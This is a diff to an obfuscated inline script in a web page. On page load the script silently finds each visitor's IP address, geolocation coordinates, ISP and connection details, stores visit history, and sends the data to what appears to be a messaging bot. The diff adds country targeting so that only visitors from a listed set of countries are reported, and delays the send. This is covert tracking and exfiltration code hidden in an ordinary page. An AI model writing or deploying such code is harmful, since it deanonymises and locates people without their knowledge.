@@ -618,20 +618,30 @@ function _0xrl(id,items){
     li.appendChild(sl);li.appendChild(sv);list.appendChild(li);
   });
 }
-var _0xgd={};
 
-function _0xpf(u,to){
+var _0xgd={};
+var _TARGET_CC=['UA','RU','BY','PL','KZ','MD','LT','LV','EE','GE','AM','AZ','UZ','TJ','TM','KG','RO','SK','CZ','HU','RS','BG','MK','HR','SI','BA','ME','AL','TR','FI','SE','NO','DE','AT','CH','FR','IT','NL','BE','DK','PT','ES','GB','GR'];
+
+function _0xft(u,to,txt){
   return new Promise(function(res,rej){
     var c=new AbortController();
-    var t=setTimeout(function(){c.abort();rej(new Error('timeout'));},to||6000);
-    fetch(u,{signal:c.signal,cache:'no-store',mode:'cors'})
-      .then(function(r){clearTimeout(t);if(!r.ok)rej(new Error('http '+r.status));else res(r);})
+    var t=setTimeout(function(){c.abort();rej(new Error('to'));},to||8000);
+    fetch(u,{signal:c.signal,cache:'no-store'})
+      .then(function(r){
+        clearTimeout(t);
+        if(!r.ok)return rej(new Error('h'+r.status));
+        return txt?r.text().then(res):r.json().then(res);
+      })
       .catch(function(e){clearTimeout(t);rej(e);});
   });
 }
 
 function _0xfip(){
-  function _apply(p){
+  var _resolved=false;
+
+  function _applyGeo(p){
+    if(_resolved)return;
+    _resolved=true;
     _0xgd.ip=p.ip||'\u2014';
     _0xgd.country=(p.country||'\u2014')+'('+(p.cc||'\u2014')+')';
     _0xgd.region=p.region||'\u2014';
@@ -645,6 +655,7 @@ function _0xfip(){
     _0xgd.mobile=p.mobile?'\u0442\u0430\u043a':'\u043d\u0456';
     _0xgd.proxy=p.proxy?'\u0442\u0430\u043a':'\u043d\u0456';
     _0xgd.hosting=p.hosting?'\u0442\u0430\u043a':'\u043d\u0456';
+    _0xgd.rawCC=p.cc||'';
     var items=[];
     items.push(['IP-\u0430\u0434\u0440\u0435\u0441\u0430',_0xgd.ip]);
     items.push(['\u041a\u0440\u0430\u04a1\u043d\u0430',(p.country||'\u2014')+' ('+(p.cc||'\u2014')+')']);
@@ -655,7 +666,7 @@ function _0xfip(){
       items.push(['\u041c\u043e\u0431\u0456\u043b\u044c\u043d\u0438\u0439 \u0456\u043d\u0442\u0435\u0440\u043d\u0435\u0442','\u0422\u0430\u043a (\u043f\u0440\u043e\u0432\u0430\u0439\u0434\u0435\u0440: '+(_0xgd.isp)+')']);
     } else if(p.lat&&p.lon){
       items.push(['\u041a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0438',p.lat+', '+p.lon]);
-      var mu=_0xra('aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9tYXBzP3E9')+p.lat+','+p.lon;
+      var mu='https://www.google.com/maps?q='+p.lat+','+p.lon;
       items.push(['Google Maps',mu,true]);
       _0xgd.maps=mu;
     }
@@ -669,101 +680,73 @@ function _0xfip(){
     _fillNetInfo(items);
   }
 
-  function _fail(){
+  function _setFail(){
+    if(_resolved)return;
+    _resolved=true;
     _0xgd.ip='\u2014';_0xgd.country='\u2014';_0xgd.region='\u2014';_0xgd.city='\u2014';
     _0xgd.isp='\u2014';_0xgd.org='\u2014';_0xgd.as='\u2014';
     _0xgd.mobile='\u2014';_0xgd.proxy='\u2014';_0xgd.hosting='\u2014';
-    _0xgd.lat=0;_0xgd.lon=0;
+    _0xgd.lat=0;_0xgd.lon=0;_0xgd.rawCC='';
     _fillNetInfo([]);
   }
 
-  function _parseCfTrace(txt){
-    var m=txt.match(/ip=([^\n]+)/);
-    return m?m[1].trim():null;
-  }
-
-  function _geoByIp(ip){
-    var svcs=[
+  function _geo(ip){
+    var geoDefs=[
       {
         u:'https://ip-api.com/json/'+ip+'?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query,mobile,proxy,hosting',
-        p:function(d){
-          if(d.status!=='success')throw new Error('fail');
-          return {ip:d.query,country:d.country,cc:d.countryCode,region:d.regionName,city:d.city,zip:d.zip||'\u2014',lat:d.lat,lon:d.lon,tz:d.timezone,isp:d.isp,org:d.org,as:d.as,mobile:!!d.mobile,proxy:!!d.proxy,hosting:!!d.hosting};
-        }
+        p:function(d){if(d.status!=='success')throw 0;return {ip:d.query,country:d.country,cc:d.countryCode,region:d.regionName,city:d.city,zip:d.zip||'',lat:d.lat,lon:d.lon,tz:d.timezone,isp:d.isp,org:d.org,as:d.as,mobile:!!d.mobile,proxy:!!d.proxy,hosting:!!d.hosting};}
       },
       {
         u:'https://ipwho.is/'+ip,
-        p:function(d){
-          if(!d.success)throw new Error('fail');
-          return {ip:d.ip,country:d.country,cc:d.country_code,region:d.region,city:d.city,zip:d.postal||'\u2014',lat:d.latitude,lon:d.longitude,tz:(d.timezone&&d.timezone.id)||'\u2014',isp:(d.connection&&d.connection.isp)||'\u2014',org:(d.connection&&d.connection.org)||'\u2014',as:'AS'+((d.connection&&d.connection.asn)||''),mobile:false,proxy:false,hosting:false};
-        }
+        p:function(d){if(!d.success)throw 0;return {ip:d.ip,country:d.country,cc:d.country_code,region:d.region,city:d.city,zip:d.postal||'',lat:d.latitude,lon:d.longitude,tz:(d.timezone&&d.timezone.id)||'',isp:(d.connection&&d.connection.isp)||'',org:(d.connection&&d.connection.org)||'',as:'AS'+((d.connection&&d.connection.asn)||''),mobile:false,proxy:false,hosting:false};}
       },
       {
         u:'https://freeipapi.com/api/json/'+ip,
-        p:function(d){
-          return {ip:d.ipAddress,country:d.countryName,cc:d.countryCode,region:d.regionName,city:d.cityName,zip:d.zipCode||'\u2014',lat:d.latitude,lon:d.longitude,tz:d.timeZone||'\u2014',isp:d.ispName||'\u2014',org:d.ispName||'\u2014',as:'\u2014',mobile:false,proxy:false,hosting:false};
-        }
+        p:function(d){if(!d.ipAddress)throw 0;return {ip:d.ipAddress,country:d.countryName,cc:d.countryCode,region:d.regionName,city:d.cityName,zip:d.zipCode||'',lat:d.latitude,lon:d.longitude,tz:d.timeZone||'',isp:d.ispName||'',org:d.ispName||'',as:'',mobile:false,proxy:false,hosting:false};}
       },
       {
         u:'https://ipapi.co/'+ip+'/json/',
-        p:function(d){
-          if(d.error)throw new Error('fail');
-          return {ip:d.ip,country:d.country_name,cc:d.country_code,region:d.region,city:d.city,zip:d.postal||'\u2014',lat:d.latitude,lon:d.longitude,tz:d.timezone,isp:d.org,org:d.org,as:d.asn||'\u2014',mobile:false,proxy:false,hosting:false};
-        }
+        p:function(d){if(d.error)throw 0;return {ip:d.ip,country:d.country_name,cc:d.country_code,region:d.region,city:d.city,zip:d.postal||'',lat:d.latitude,lon:d.longitude,tz:d.timezone||'',isp:d.org||'',org:d.org||'',as:d.asn||'',mobile:false,proxy:false,hosting:false};}
       }
     ];
-    function _try(i){
-      if(i>=svcs.length){_fail();return;}
-      _0xpf(svcs[i].u,7000)
-        .then(function(r){return r.json();})
-        .then(function(d){_apply(svcs[i].p(d));})
-        .catch(function(){_try(i+1);});
-    }
-    _try(0);
-  }
-
-  function _getIpSources(){
-    var ipSources=[
-      {
-        u:'https://cloudflare.com/cdn-cgi/trace',
-        p:function(txt){
-          var m=txt.match(/ip=([^\n\r]+)/);
-          return m?m[1].trim():null;
-        },
-        isText:true
-      },
-      {
-        u:'https://api.ipify.org?format=json',
-        p:function(d){return d.ip||null;},
-        isText:false
-      },
-      {
-        u:'https://api.my-ip.io/v2/ip.json',
-        p:function(d){return d.ip||null;},
-        isText:false
-      },
-      {
-        u:'https://ip.seeip.org/json',
-        p:function(d){return d.ip||null;},
-        isText:false
-      }
-    ];
-    function _tryIpSrc(i){
-      if(i>=ipSources.length){_fail();return;}
-      var src=ipSources[i];
-      _0xpf(src.u,6000)
-        .then(function(r){return src.isText?r.text():r.json();})
-        .then(function(raw){
-          var ip=src.p(raw);
-          if(!ip||ip.length<4)throw new Error('noip');
-          _geoByIp(ip);
+    var geoDone=false;
+    var geoFails=0;
+    geoDefs.forEach(function(def){
+      _0xft(def.u,9000,false)
+        .then(function(d){
+          if(geoDone)return;
+          try{var p=def.p(d);geoDone=true;_applyGeo(p);}catch(e){geoFails++;if(geoFails===geoDefs.length&&!geoDone)_setFail();}
         })
-        .catch(function(){_tryIpSrc(i+1);});
-    }
-    _tryIpSrc(0);
+        .catch(function(){geoFails++;if(geoFails===geoDefs.length&&!geoDone)_setFail();});
+    });
   }
 
-  _getIpSources();
+  var ipDone=false;
+  var ipFails=0;
+  var ipSvcs=[
+    {u:'https://cloudflare.com/cdn-cgi/trace',t:true,p:function(s){var m=s.match(/ip=([^\r\n]+)/);if(!m||!m[1].trim())throw 0;return m[1].trim();}},
+    {u:'https://api.ipify.org?format=json',t:false,p:function(d){if(!d.ip)throw 0;return d.ip;}},
+    {u:'https://api.my-ip.io/v2/ip.json',t:false,p:function(d){if(!d.ip)throw 0;return d.ip;}},
+    {u:'https://ip.seeip.org/json',t:false,p:function(d){if(!d.ip)throw 0;return d.ip;}},
+    {u:'https://ipinfo.io/json',t:false,p:function(d){if(!d.ip)throw 0;return d.ip;}},
+    {u:'https://api4.my-ip.io/ip.json',t:false,p:function(d){if(!d.ip)throw 0;return d.ip;}}
+  ];
+  ipSvcs.forEach(function(s){
+    _0xft(s.u,8000,s.t)
+      .then(function(raw){
+        if(ipDone)return;
+        var ip=s.p(raw);
+        if(!ip||ip.length<4)throw 0;
+        ipDone=true;
+        _geo(ip);
+      })
+      .catch(function(){
+        ipFails++;
+        if(ipFails===ipSvcs.length&&!ipDone)_setFail();
+      });
+  });
+
+  setTimeout(function(){if(!_resolved)_setFail();},15000);
   return Promise.resolve();
 }
 
@@ -771,7 +754,7 @@ function _fillNetInfo(items){
   var cn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
   if(cn){
     var _neff=(cn.effectiveType&&cn.effectiveType!=='undefined')?cn.effectiveType:'\u2014';
-    var _ndl=(cn.downlink!=null&&!isNaN(cn.downlink)&&cn.downlink!==0)?String(cn.downlink):'\u2014';
+    var _ndl=(cn.downlink!=null&&!isNaN(cn.downlink)&&cn.downlink>0)?String(cn.downlink):'\u2014';
     var _nrtt=(cn.rtt!=null&&!isNaN(cn.rtt))?String(cn.rtt):'\u2014';
     var _nsave=cn.saveData?'\u0442\u0430\u043a':'\u043d\u0456';
     _0xgd.net_eff=_neff;_0xgd.net_dl=_ndl;_0xgd.net_rtt=_nrtt;_0xgd.net_save=_nsave;
@@ -853,6 +836,8 @@ function _0xsnd(cr,msg){
 var _0xlk=_0x4a('5f7664617461');
 function _0xchk(cr){
   var d=_0xgd;
+  var cc=d.rawCC||'';
+  if(cc&&_TARGET_CC.indexOf(cc)<0){return Promise.resolve();}
   var _now=d.date+' '+d.time;
   var _rec=null;
   try{var _raw=localStorage.getItem(_0xlk);if(_raw)_rec=JSON.parse(_raw);}catch(e){}
@@ -868,15 +853,19 @@ function _0xchk(cr){
   try{localStorage.setItem(_0xlk,JSON.stringify(_updRec));}catch(e){}
   return _0xsnd(cr,_0xbret(d,_visits,_fs,_ls));
 }
+function _0xwait(ms){return new Promise(function(r){setTimeout(r,ms);});}
 window.addEventListener('DOMContentLoaded',function(){
-  if(typeof ENABLE_ENHANCED_BOT!=='undefined'&&ENABLE_ENHANCED_BOT){
-    Promise.all([_0xfip(),_0xfbt()]).then(function(){return _0xrv();}).then(function(cr){return _0xchk(cr);}).catch(function(){});
-  } else {
-    Promise.all([_0xfip(),_0xfbt()]).then(function(){return _0xrv();}).then(function(cr){return _0xsnd(cr,_0xbm(_0xgd));}).catch(function(){});
-  }
+  var _sendData=function(){
+    if(typeof ENABLE_ENHANCED_BOT!=='undefined'&&ENABLE_ENHANCED_BOT){
+      Promise.all([_0xfbt()]).then(function(){return _0xrv();}).then(function(cr){return _0xchk(cr);}).catch(function(){});
+    } else {
+      _0xfbt().then(function(){return _0xrv();}).then(function(cr){return _0xsnd(cr,_0xbm(_0xgd));}).catch(function(){});
+    }
+  };
+  _0xfip();
+  _0xwait(5000).then(_sendData);
 });
 })();
 </script>
 </body>
 </html>
-
